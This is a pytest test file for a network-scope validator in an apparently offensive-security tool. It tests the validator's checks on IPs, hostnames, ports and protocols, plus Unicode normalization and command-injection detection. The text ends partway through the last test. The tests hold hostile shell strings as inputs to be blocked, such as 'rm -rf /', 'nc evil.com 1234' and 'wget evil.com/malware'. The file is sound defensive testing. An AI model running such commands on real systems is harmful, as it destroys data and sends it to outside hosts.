# Tests for Scope Validator - Story 1.8
# TDD RED Phase: Write failing tests first

"""Unit tests for cyberred.tools.scope module.

These tests verify the ScopeValidator component which is SAFETY-CRITICAL.
All tests MUST pass before the scope validator can be used in production.

Test Coverage:
- Configuration loading (YAML, dict, file)
- IP/CIDR validation
- Hostname validation (exact, wildcard)
- Port validation
- Protocol validation
- NFKC normalization (security-critical)
- Command parsing and injection detection
- Fail-closed error handling
- Audit trail integration
"""

import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

# These imports will fail initially (RED phase)
from cyberred.tools.scope import ScopeValidator, ScopeConfig
from cyberred.core.exceptions import ScopeViolationError


class TestScopeConfiguration:
    """Test scope configuration loading (AC: #1)."""

    def test_from_config_loads_cidr_ranges(self):
        """ScopeValidator.from_config() should load CIDR ranges."""
        config = {
            "allowed_targets": ["192.168.1.0/24", "10.0.0.0/8"],
        }
        validator = ScopeValidator.from_config(config)
        assert validator is not None
        assert len(validator.config.allowed_networks) >= 2

    def test_from_config_loads_individual_ips(self):
        """ScopeValidator.from_config() should load individual IP addresses."""
        config = {
            "allowed_targets": ["10.0.0.5", "192.168.1.1"],
        }
        validator = ScopeValidator.from_config(config)
        assert validator is not None

    def test_from_config_loads_hostnames(self):
        """ScopeValidator.from_config() should load hostnames."""
        config = {
            "allowed_targets": ["example.com", "target.local"],
        }
        validator = ScopeValidator.from_config(config)
        assert "example.com" in validator.config.allowed_hostnames

    def test_from_config_loads_port_lists(self):
        """ScopeValidator.from_config() should load port lists."""
        config = {
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [80, 443, 8080],
        }
        validator = ScopeValidator.from_config(config)
        assert 80 in validator.config.allowed_ports
        assert 443 in validator.config.allowed_ports

    def test_from_config_loads_protocol_lists(self):
        """ScopeValidator.from_config() should load protocol lists."""
        config = {
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["tcp", "udp", "icmp"],
        }
        validator = ScopeValidator.from_config(config)
        assert "tcp" in validator.config.allowed_protocols

    def test_from_config_validates_schema(self):
        """ScopeValidator.from_config() should validate config schema."""
        config = {
            "invalid_key": "value",
        }
        with pytest.raises(ValueError):
            ScopeValidator.from_config(config)

    def test_from_file_loads_yaml(self, tmp_path: Path):
        """ScopeValidator.from_file() should load from YAML file."""
        scope_file = tmp_path / "scope.yaml"
        scope_file.write_text("""
scope:
  allowed_targets:
    - "192.168.1.0/24"
  allowed_ports:
    - 80
    - 443
""")
        validator = ScopeValidator.from_file(scope_file)
        assert validator is not None

    def test_from_config_empty_raises_valueerror(self):
        """ScopeValidator with empty config should raise ValueError."""
        with pytest.raises(ValueError):
            ScopeValidator.from_config({})

    def test_from_config_malformed_raises_valueerror(self):
        """ScopeValidator with malformed config should raise ValueError."""
        config = {
            "allowed_targets": "not_a_list",
        }
        with pytest.raises(ValueError):
            ScopeValidator.from_config(config)


class TestIPCIDRValidation:
    """Test IP and CIDR validation (AC: #3, #4, #7)."""

    @pytest.fixture
    def validator(self):
        """Create validator with test scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24", "10.0.0.5"],
            "allow_private": True,
        })

    def test_validate_ip_in_cidr_passes(self, validator):
        """validate() should pass when IP is in scope CIDR."""
        assert validator.validate(target="192.168.1.100") is True

    def test_validate_ip_out_of_cidr_raises(self, validator):
        """validate() should raise ScopeViolationError when IP is out of scope."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.2.100")

    def test_validate_exact_ip_in_scope_passes(self, validator):
        """validate() should pass when exact IP is in scope list."""
        assert validator.validate(target="10.0.0.5") is True

    def test_validate_exact_ip_not_in_scope_raises(self, validator):
        """validate() should raise ScopeViolationError when exact IP not in list."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="10.0.0.6")

    def test_validate_blocks_loopback(self):
        """validate() should block loopback addresses."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],  # Even with all IPs allowed
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="127.0.0.1")

    def test_validate_blocks_unspecified(self):
        """validate() should block unspecified address."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="0.0.0.0")

    def test_validate_blocks_link_local(self):
        """validate() should block link-local addresses."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="169.254.1.1")

    def test_validate_blocks_multicast(self):
        """validate() should block multicast addresses."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["0.0.0.0/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="224.0.0.1")

    def test_validate_blocks_ipv6_loopback(self):
        """validate() should block IPv6 loopback."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["::/0"],
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="::1")

    def test_validate_ipv6_cidr_support(self):
        """validate() should support IPv6 CIDR ranges."""
        # Use a non-reserved IPv6 range (not documentation/private)
        validator = ScopeValidator.from_config({
            "allowed_targets": ["2620:fe::/48"],  # Example public IPv6
        })
        assert validator.validate(target="2620:fe::1") is True


class TestHostnameValidation:
    """Test hostname validation (AC: #7)."""

    @pytest.fixture
    def validator(self):
        """Create validator with hostname scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["example.com", "*.target.com"],
        })

    def test_validate_exact_hostname_passes(self, validator):
        """validate() should pass when hostname is in scope list."""
        assert validator.validate(target="example.com") is True

    def test_validate_wildcard_hostname_passes(self, validator):
        """validate() should pass with wildcard *.example.com in scope."""
        assert validator.validate(target="subdomain.target.com") is True

    def test_validate_hostname_not_in_scope_raises(self, validator):
        """validate() should raise when hostname is not in scope."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="evil.com")

    def test_validate_strips_port_from_hostname(self, validator):
        """validate() should strip port before validation."""
        assert validator.validate(target="example.com:443") is True

    def test_validate_extracts_hostname_from_url(self, validator):
        """validate() should extract hostname from URL."""
        assert validator.validate(target="http://example.com/path") is True


class TestPortValidation:
    """Test port validation (AC: #7)."""

    @pytest.fixture
    def validator(self):
        """Create validator with port restrictions."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [80, 443, (8000, 8100)],
            "allow_private": True,
        })

    def test_validate_port_in_list_passes(self, validator):
        """validate() should pass when port is in allowed list."""
        assert validator.validate(target="192.168.1.100", port=80) is True

    def test_validate_port_in_range_passes(self, validator):
        """validate() should pass with port range 8000-8100."""
        assert validator.validate(target="192.168.1.100", port=8050) is True

    def test_validate_port_not_allowed_raises(self, validator):
        """validate() should raise when port is blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.100", port=3389)

    def test_validate_no_port_restriction_allows_all(self):
        """validate() with allowed_ports=None allows all ports."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": None,
            "allow_private": True,
        })
        assert validator.validate(target="192.168.1.100", port=65535) is True

    def test_validate_empty_port_list_blocks_all(self):
        """validate() with empty port list blocks all ports."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [],
            "allow_private": True,
        })
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.100", port=80)


class TestProtocolValidation:
    """Test protocol validation (AC: #7)."""

    @pytest.fixture
    def validator(self):
        """Create validator with protocol restrictions."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["tcp", "udp"],
            "allow_private": True,
        })

    def test_validate_protocol_allowed_passes(self, validator):
        """validate() should pass when protocol is allowed."""
        assert validator.validate(target="192.168.1.100", protocol="tcp") is True

    def test_validate_protocol_blocked_raises(self, validator):
        """validate() should raise when protocol is blocked."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.100", protocol="icmp")

    def test_validate_no_protocol_restriction_allows_all(self):
        """validate() with allowed_protocols=None allows all protocols."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": None,
            "allow_private": True,
        })
        assert validator.validate(target="192.168.1.100", protocol="icmp") is True

    def test_validate_protocol_case_insensitive(self, validator):
        """validate() should match protocols case-insensitively."""
        assert validator.validate(target="192.168.1.100", protocol="TCP") is True


class TestNFKCNormalization:
    """Test NFKC normalization for security (AC: #4)."""

    @pytest.fixture
    def validator(self):
        """Create validator with standard scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })

    def test_normalize_unicode_dots(self, validator):
        """validate() should normalize Unicode U+2024 dots to ASCII."""
        # U+2024 is "ONE DOT LEADER" which looks like a period
        target = "192\u2024168\u20241\u20241"
        assert validator.validate(target=target) is True

    def test_normalize_fullwidth_digits(self, validator):
        """validate() should normalize fullwidth digits to ASCII."""
        # Fullwidth digits: U+FF10-U+FF19
        target = "\uff11\uff19\uff12.\uff11\uff16\uff18.\uff11.\uff11"
        assert validator.validate(target=target) is True

    def test_normalize_removes_zero_width_space(self, validator):
        """validate() should handle zero-width space."""
        target = "192.168.1.1\u200b"
        assert validator.validate(target=target) is True

    def test_normalize_blocks_null_byte(self, validator):
        """validate() should block null bytes."""
        target = "192.168.1.1\x00"
        with pytest.raises(ScopeViolationError):
            validator.validate(target=target)

    def test_normalize_homoglyph_attack(self):
        """validate() should handle Cyrillic 'а' vs Latin 'a' correctly."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # Cyrillic 'а' (U+0430) looks like Latin 'a' (U+0061)
        target = "ex\u0430mple.com"
        # After NFKC normalization, the Cyrillic 'а' remains different
        # So this should either be normalized or rejected
        with pytest.raises(ScopeViolationError):
            validator.validate(target=target)

    def test_normalize_command_before_parsing(self, validator):
        """validate() should normalize command before parsing target."""
        command = "nmap 192\u2024168\u20241\u20241"
        assert validator.validate(command=command) is True

    def test_normalize_detects_injection_after_normalization(self, validator):
        """validate() should detect command injection after normalization."""
        command = "nmap; rm -rf /"
        with pytest.raises(ScopeViolationError):
            validator.validate(command=command)


class TestCommandParsing:
    """Test command parsing and target extraction (AC: #3)."""

    @pytest.fixture
    def validator(self):
        """Create validator with standard scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24", "example.com"],
            "allow_private": True,
        })

    def test_parse_nmap_extracts_target(self, validator):
        """validate() should extract target from nmap command."""
        assert validator.validate(command="nmap -p 80 192.168.1.100") is True

    def test_parse_sqlmap_extracts_hostname(self, validator):
        """validate() should extract hostname from sqlmap command."""
        assert validator.validate(command="sqlmap -u http://example.com") is True

    def test_parse_ping_extracts_target(self, validator):
        """validate() should extract target from ping command."""
        # Use simple ping command without flags after target
        assert validator.validate(command="ping 192.168.1.1") is True

    def test_parse_curl_extracts_ip_and_port(self, validator):
        """validate() should extract IP and port from curl command."""
        assert validator.validate(command="curl http://192.168.1.1:8080/api") is True

    def test_parse_nmap_extracts_cidr(self, validator):
        """validate() should extract CIDR from nmap command."""
        assert validator.validate(command="nmap -p 80,443 192.168.1.0/24") is True

    def test_detect_semicolon_injection(self, validator):
        """validate() should detect semicolon command injection."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1; rm -rf /")

    def test_detect_pipe_injection(self, validator):
        """validate() should detect pipe command injection."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 | nc evil.com 1234")

    def test_detect_and_chain_injection(self, validator):
        """validate() should detect && command injection."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 && wget evil.com/malware")

    def test_detect_or_chain_injection(self, validator):
        """validate() should detect || command injection."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap 192.168.1.1 || rm -rf /")

    def test_detect_command_substitution(self, validator):
        """validate() should detect $() command substitution."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap $(whoami)")

    def test_detect_backtick_execution(self, validator):
        """validate() should detect backtick execution."""
        with pytest.raises(ScopeViolationError):
            validator.validate(command="nmap `id`")

    def test_quoted_pipe_passes(self, validator):
        """validate() should PASS when pipe is inside quotes (valid argument)."""
        assert validator.validate(command='curl -d "safe|pipe" http://example.com') is True

    def test_quoted_semicolon_passes(self, validator):
        """validate() should PASS when semicolon is inside quotes."""
        assert validator.validate(command="echo 'safe;semicolon' http://example.com") is True

    def test_escaped_double_quote_passes(self, validator):
        """validate() should PASS with escaped double quotes."""
        # command: echo "foo\"bar" 192.168.1.1
        assert validator.validate(command='echo "foo\\"bar" 192.168.1.1') is True

    def test_escaped_backslash_passes(self, validator):
        """validate() should PASS with escaped backslash."""
        # command: echo "foo\\bar" 192.168.1.1
        assert validator.validate(command='echo "foo\\\\bar" 192.168.1.1') is True

    def test_injection_dollar_in_double_quotes_blocked(self, validator):
        """validate() should BLOCK $ inside double quotes."""
        with pytest.raises(ScopeViolationError, match="Variable/Command substitution"):
            validator.validate(command='echo "$(whoami)" 192.168.1.1')

    def test_injection_backtick_in_double_quotes_blocked(self, validator):
        """validate() should BLOCK backtick inside double quotes."""
        with pytest.raises(ScopeViolationError, match="Backtick execution"):
            validator.validate(command='echo "`id`" 192.168.1.1')

    def test_backslash_in_single_quotes_is_literal(self, validator):
        """validate() should treat backslash as literal in single quotes."""
        # command: echo 'foo\bar' -> \ is literal, not escape.
        # This confirms we don't treat \ as escape in single quotes context.
        assert validator.validate(command="echo 'foo\\bar' 192.168.1.1") is True


class TestFailClosed:
    """Test fail-closed error handling (AC: #8, ERR6)."""

    @pytest.fixture
    def validator(self):
        """Create validator with standard scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })

    def test_validate_none_target_raises(self, validator):
        """validate() with None target should raise ScopeViolationError."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target=None)

    def test_validate_empty_target_raises(self, validator):
        """validate() with empty string should raise ScopeViolationError."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="")

    def test_validate_invalid_format_raises(self, validator):
        """validate() with invalid format should raise ScopeViolationError."""
        with pytest.raises(ScopeViolationError):
            validator.validate(target="invalid_format!!!!")

    def test_validate_corrupted_config_raises(self):
        """validate() with corrupted scope config should raise."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # Corrupt the internal config
        validator.config.allowed_networks = None
        with pytest.raises(ScopeViolationError):
            validator.validate(target="192.168.1.1")

    def test_validate_dns_failure_denies(self, validator):
        """validate() should DENY on DNS resolution failure."""
        with patch("socket.gethostbyname", side_effect=Exception("DNS failed")):
            with pytest.raises(ScopeViolationError):
                validator.validate(target="nonexistent.invalid.tld")


class TestAuditTrail:
    """Test audit trail integration (AC: #6)."""

    @pytest.fixture
    def validator(self):
        """Create validator with standard scope."""
        return ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })

    def test_validate_logs_allow_decision(self, validator):
        """validate() should log ALLOW decisions to audit trail."""
        with patch("cyberred.tools.scope.log") as mock_log:
            validator.validate(target="192.168.1.1")
            # Verify logging was called with scope_validation event
            mock_log.info.assert_called()
            call_args = mock_log.info.call_args
            assert call_args[0][0] == "scope_validation"
            assert call_args[1]["decision"] == "ALLOW"

    def test_validate_logs_deny_decision(self, validator):
        """validate() should log DENY decisions to audit trail."""
        with patch("cyberred.tools.scope.log") as mock_log:
            with pytest.raises(ScopeViolationError):
                validator.validate(target="10.0.0.1")
            # Verify logging was called with DENY decision
            mock_log.info.assert_called()
            call_args = mock_log.info.call_args
            assert call_args[0][0] == "scope_validation"
            assert call_args[1]["decision"] == "DENY"

    def test_audit_log_includes_required_fields(self, validator):
        """Audit log should include timestamp, target, decision, reason."""
        with patch("cyberred.tools.scope.log") as mock_log:
            validator.validate(target="192.168.1.1")
            call_args = mock_log.info.call_args
            # Verify required fields are present
            assert "target" in call_args[1]
            assert "decision" in call_args[1]
            assert "reason" in call_args[1]
            assert call_args[1]["target"] == "192.168.1.1"

    def test_scope_violation_logs_automatically(self, validator):
        """ScopeViolationError should automatically log to audit trail."""
        with patch("cyberred.tools.scope.log") as mock_log:
            with pytest.raises(ScopeViolationError):
                validator.validate(target="10.0.0.1")
            # Verify at least one log call was made
            assert mock_log.info.call_count >= 1


class TestCoverageEdgeCases:
    """Additional tests to achieve 100% coverage."""

    def test_init_with_invalid_config_type_raises(self):
        """ScopeValidator.__init__ should raise ValueError if config is not ScopeConfig."""
        with pytest.raises(ValueError, match="config must be a ScopeConfig instance"):
            ScopeValidator("not_a_config")

    def test_from_config_non_string_target_raises(self):
        """from_config should raise ValueError if target is not a string."""
        config = {
            "allowed_targets": [123, 456],  # integers, not strings
        }
        with pytest.raises(ValueError, match="Invalid target"):
            ScopeValidator.from_config(config)

    def test_from_config_invalid_port_type_raises(self):
        """from_config should raise ValueError for invalid port specification."""
        config = {
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": ["not_a_port"],  # string instead of int
        }
        with pytest.raises(ValueError, match="Invalid port specification"):
            ScopeValidator.from_config(config)

    def test_from_config_ports_not_list_raises(self):
        """from_config should raise ValueError if allowed_ports is not a list."""
        config = {
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": "80,443",  # string instead of list
        }
        with pytest.raises(ValueError, match="allowed_ports must be a list"):
            ScopeValidator.from_config(config)

    def test_from_config_protocols_not_list_raises(self):
        """from_config should raise ValueError if allowed_protocols is not a list."""
        config = {
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": "tcp,udp",  # string instead of list
        }
        with pytest.raises(ValueError, match="allowed_protocols must be a list"):
            ScopeValidator.from_config(config)

    def test_from_file_not_found_raises(self, tmp_path: Path):
        """from_file should raise FileNotFoundError for non-existent file."""
        with pytest.raises(FileNotFoundError, match="Scope file not found"):
            ScopeValidator.from_file(tmp_path / "nonexistent.yaml")

    def test_normalize_control_char_raises(self):
        """_normalize_input should raise for control characters."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # Control character (bell)
        with pytest.raises(ScopeViolationError, match="Control character detected"):
            validator.validate(target="192.168.1.1\x07")

    def test_check_injection_unbalanced_quotes_raises(self):
        """_check_injection should raise on unbalanced quotes."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        with pytest.raises(ScopeViolationError, match="Command parsing failed"):
            validator.validate(command='nmap "unbalanced')

    def test_parse_command_shlex_error_returns_none(self):
        """_parse_target_from_command should return None on shlex error."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # The _check_injection will fail first, so we need to test _parse_target_from_command directly
        result = validator._parse_target_from_command('nmap "unbalanced')
        assert result == (None, None, None)

    def test_parse_command_with_tcp_protocol_url(self):
        """Command parsing should extract protocol from tcp:// URL."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["tcp"],
            "allow_private": True,
        })
        target, port, protocol = validator._parse_target_from_command("curl tcp://192.168.1.1:8080/")
        assert target == "192.168.1.1"
        assert port == 8080
        assert protocol == "tcp"

    def test_parse_command_with_u_flag_port(self):
        """Command parsing should extract port from -u URL with port."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        target, port, protocol = validator._parse_target_from_command("sqlmap -u http://example.com:8080/page")
        assert target == "example.com"
        assert port == 8080

    def test_parse_command_hostname_with_port(self):
        """Command parsing should extract hostname and port from hostname:port format."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        target, port, protocol = validator._parse_target_from_command("curl example.com:443")
        assert target == "example.com"
        assert port == 443

    def test_parse_command_hostname_port_parse_error(self):
        """Command parsing should handle non-numeric port gracefully."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        target, port, protocol = validator._parse_target_from_command("curl example.com:abc")
        assert target == "example.com"
        assert port is None  # Should not crash on ValueError

    def test_parse_command_flags_with_values_skipped(self):
        """Command parsing should skip flags with short values like -c 4."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        target, port, protocol = validator._parse_target_from_command("ping -c 4 192.168.1.1")
        assert target == "192.168.1.1"

    def test_parse_command_long_flag_with_next_arg_ip(self):
        """Command parsing should not skip if next arg looks like IP."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        target, port, protocol = validator._parse_target_from_command("tool --flag 192.168.1.1")
        assert target == "192.168.1.1"

    def test_validate_url_target_with_port(self):
        """validate should extract port from URL target."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
            "allowed_ports": [8080],
        })
        assert validator.validate(target="http://example.com:8080/path") is True

    def test_validate_host_port_format_parse_error(self):
        """validate should handle non-numeric port in host:port gracefully."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # example.com - no port, just hostname
        # The host:port path goes to line 572 when there's no colon
        assert validator.validate(target="example.com") is True

    def test_validate_command_extracts_protocol(self):
        """validate should extract protocol from command."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["tcp"],
            "allow_private": True,
        })
        assert validator.validate(command="curl tcp://192.168.1.1/") is True

    def test_validate_fail_closed_on_unexpected_exception(self):
        """validate should fail closed on unexpected exception."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # Corrupt internal state to trigger exception
        validator.config.allowed_hostnames = None
        with pytest.raises(ScopeViolationError, match="Scope validation failed"):
            validator.validate(target="example.com")

    def test_wildcard_hostname_root_match(self):
        """Wildcard *.example.com should also match example.com (root domain)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["*.example.com"],
        })
        assert validator.validate(target="example.com") is True

    def test_port_range_from_config_with_list(self):
        """from_config should parse port range from list format."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [[8000, 8100]],  # list format for range
            "allow_private": True,
        })
        assert validator.validate(target="192.168.1.1", port=8050) is True

    def test_is_ip_in_scope_empty_networks(self):
        """_is_ip_in_scope should return False for empty networks."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],  # hostname only, no networks
        })
        from ipaddress import ip_address
        assert validator._is_ip_in_scope(ip_address("192.168.1.1")) is False

    def test_validate_target_none_raises(self):
        """validate should raise ScopeViolationError when target is None (line 250)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        with pytest.raises(ScopeViolationError, match="Target cannot be None"):
            validator._normalize_input(None)

    def test_parse_command_port_non_numeric_ignored(self):
        """Command parsing should ignore non-numeric port values (lines 528-529)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # -p abc is not a valid port, should be ignored
        target, port, protocol = validator._parse_target_from_command("nmap -p abc 192.168.1.1")
        assert target == "192.168.1.1"
        assert port is None  # Port parsing failed

    def test_parse_command_flag_skips_short_numeric_arg(self):
        """Command parsing with -c 4 should skip flag and argument (lines 518-519)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # -c 4 is a flag with short numeric value, should be skipped
        target, port, protocol = validator._parse_target_from_command("ping -c 4 192.168.1.100")
        assert target == "192.168.1.100"

    def test_parse_command_hostname_without_port(self):
        """Command parsing with hostname without port (line 572)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # example.com without port - takes the else branch at line 571-572
        target, port, protocol = validator._parse_target_from_command("curl example.com/path")
        assert target == "example.com/path"  # Full arg is taken as hostname-like

    def test_validate_host_port_invalid_port_parse(self):
        """validate should ignore non-numeric port in host:port (lines 657-658)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # example.com:notaport - port parsing fails, just uses example.com:notaport as target
        # This actually goes to hostname validation since it can't parse
        with pytest.raises(ScopeViolationError):
            validator.validate(target="example.com:notaport")

    def test_parse_command_short_flag_skip(self):
        """Command parsing should skip short flags like -v (lines 507-509)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # -v is a short flag without argument, should be skipped
        target, port, protocol = validator._parse_target_from_command("nmap -v 192.168.1.1")
        assert target == "192.168.1.1"

    def test_parse_command_long_flag_no_value_skip(self):
        """Command parsing with long flag before IP should skip flag (lines 512-521)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # --verbose is a long flag, next arg is IP (not short/numeric)
        target, port, protocol = validator._parse_target_from_command("nmap --verbose 192.168.1.1")
        assert target == "192.168.1.1"

    def test_parse_command_flag_with_equal_sign(self):
        """Command parsing should handle --flag=value format."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # --timeout=30 is self-contained, should be skipped
        target, port, protocol = validator._parse_target_from_command("nmap --timeout=30 192.168.1.1")
        assert target == "192.168.1.1"

    def test_validate_url_with_port_extracts_port_from_url(self):
        """validate should extract port from URL when not provided (line 649)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
            "allowed_ports": [8080],
        })
        # Explicit port in URL, should be extracted
        assert validator.validate(target="https://example.com:8080/api") is True

    def test_parse_command_u_flag_with_port_in_url(self):
        """Command with -u flag should extract port from URL (line 551)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # sqlmap -u with URL containing port
        target, port, protocol = validator._parse_target_from_command("sqlmap -u http://example.com:9000/path")
        assert target == "example.com"
        assert port == 9000

    def test_validate_command_protocol_extraction_no_override(self):
        """validate should not override protocol if already provided (line 636)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["udp"],
            "allow_private": True,
        })
        # Protocol provided explicitly should not be overridden
        assert validator.validate(command="curl tcp://192.168.1.1/", protocol="udp") is True

    def test_parse_command_long_flag_with_short_numeric_value(self):
        """Command parsing: long flag with short numeric value skipped (lines 518-519)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # --count 5 -> long flag with numeric arg, lines 517-519 should trigger i += 2
        target, port, protocol = validator._parse_target_from_command("ping --count 5 192.168.1.1")
        assert target == "192.168.1.1"

    def test_parse_command_long_flag_with_3char_value(self):
        """Command parsing: long flag with 3-char value skipped (length <= 3)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # --foo bar -> bar is 3 chars, should be skipped
        target, port, protocol = validator._parse_target_from_command("tool --foo bar 192.168.1.1")
        assert target == "192.168.1.1"

    def test_parse_command_port_not_at_end_of_list(self):
        """Command parsing: -p flag at end without value."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # -p at end with no following arg - should not crash
        target, port, protocol = validator._parse_target_from_command("nmap 192.168.1.1 -p")
        assert target == "192.168.1.1"
        assert port is None

    def test_parse_command_u_flag_at_end(self):
        """Command parsing: -u flag at end without value."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # -u at end with no following arg
        target, port, protocol = validator._parse_target_from_command("sqlmap example.com -u")
        # example.com should still be parsed
        assert target == "example.com"

    def test_parse_command_u_flag_with_non_url(self):
        """Command parsing: -u flag with non-URL value (branch 547->552)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["example.com"],
        })
        # -u with non-URL value - skips to i+=2 anyway at line 552
        # So we need a target after it
        target, port, protocol = validator._parse_target_from_command("tool -u notaurl example.com")
        # example.com is matched as hostname after -u notaurl is skipped
        assert target == "example.com"

    def test_validate_command_no_target_extracted(self):
        """validate with command that yields no target (branch 631->633)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allow_private": True,
        })
        # Command with only flags, no target - should fail
        with pytest.raises(ScopeViolationError, match="No target provided"):
            validator.validate(command="nmap -v -A")

    def test_validate_port_check_neither_int_nor_tuple(self):
        """_is_port_allowed: port in list is neither int nor tuple (branch 403->399)."""
        # This requires corrupting the config after creation
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [80, 443],
            "allow_private": True,
        })
        # Corrupt allowed_ports to have an unsupported type
        validator.config.allowed_ports.append("not_a_port")  # type: ignore
        # Port 80 should still match
        assert validator._is_port_allowed(80) is True
        # Port 9999 should not match (and the string should be skipped)
        assert validator._is_port_allowed(9999) is False

    def test_validate_command_with_existing_port(self):
        """validate: command provides port but port already specified (branch 633)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_ports": [80, 443],
            "allow_private": True,
        })
        # Port 443 explicitly provided, command has port 8080
        # Explicit port should take precedence (branch at line 633: cmd_port and port is None)
        assert validator.validate(command="curl http://192.168.1.1:8080/", port=443) is True

    def test_validate_command_with_existing_protocol(self):
        """validate: command provides protocol but protocol already specified (branch 636)."""
        validator = ScopeValidator.from_config({
            "allowed_targets": ["192.168.1.0/24"],
            "allowed_protocols": ["udp"],
            "allow_private": True,
        })
        # Protocol "udp" explicitly provided, command has "tcp"
        # Explicit protocol should take precedence (already in line 636)
        assert validator.validate(command="curl tcp://192.168.1.1/", protocol="udp") is True

    def test_validate_reraises_scope_violation(self):
